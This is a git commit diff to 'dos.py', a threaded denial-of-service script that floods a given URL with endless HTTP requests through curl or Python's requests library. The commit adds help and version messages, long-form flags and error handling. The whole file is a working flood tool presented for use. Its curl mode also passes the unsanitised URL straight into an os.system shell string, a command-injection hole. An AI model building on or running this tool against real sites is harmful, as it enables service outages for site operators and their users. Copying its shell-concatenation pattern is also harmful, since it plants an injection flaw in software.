f592a3cbf35eaed16a900118c5d7124835a3df03
Theo Henson <theodorehenson@protonmail.com>
2020-03-16 18:44:19 -0400

    Better errors and version/help messages

--- dos.py
+++ dos.py
@@ -1,7 +1,7 @@
 import threading
 from os import system
-from sys import argv
-from requests import get
+from sys import argv, stderr
+import requests
 from os import _exit
 
 def generate(url, thread_count, verbose, py):
@@ -25,33 +25,66 @@ def ping(url, thread_count, verbose, py, num):
     while True:
         if threading.active_count() == thread_count:
             if py:
-                get(url)
+                try:
+                    requests.get(url)
+                except requests.exceptions.MissingSchema:
+                    print("Invalid URL", file=stderr)
+                    _exit(1)
             else:
                 system("curl " + url + " &> /dev/null")
             if verbose:
                 ping_count += 1
                 print("Thread pinged: " + url + " Total: " + str(ping_count) + " ID: " + str(num))
 
+
+
+if len(argv) == 0:
+    exit(0)
+
 try:
     url = argv[1]
+    if url == "--help" or url == "-h":
+        print("""Usage:
+    python dos.py [options] | [<destination> <# of threads> [flags]]
+
+Flags:
+    -v, --verbose: verbose output
+
+    -p, --python: use python's built in request module instead of curl. This is much slower and more error prone. Only use this option if you do not have curl
+
+Options:
+    -h, --help: prints help message
+
+    -V, --version: print version information
+""")
+        exit(0)
+
+    if url == "--version" or url == "-V":
+        print("dos-0.1.0")
+        exit(0)
+
 except IndexError:
-    print("No URL provided", file=sys.stderr)
+    print("No URL provided", file=stderr)
     exit(1)
 
 try:
     thread_count = int(argv[2]) + 1
 except IndexError:
-    print("No thread count provided", file=sys.stderr)
+    print("No thread count provided", file=stderr)
+    exit(1)
+except ValueError:
+    print("Non-integer thread count provided", file=stderr)
     exit(1)
 
 ping_count = 0
 verbose = False
 py = False
 
-if "-v" in argv:
+if "-v" in argv or "--verbose" in argv:
     verbose = True
 
-if "-p" in argv:
+if "-p" in argv or "--python" in argv:
     py = True
+    print("Using built-in python requests module")
 
 generate(url, thread_count, verbose, py)
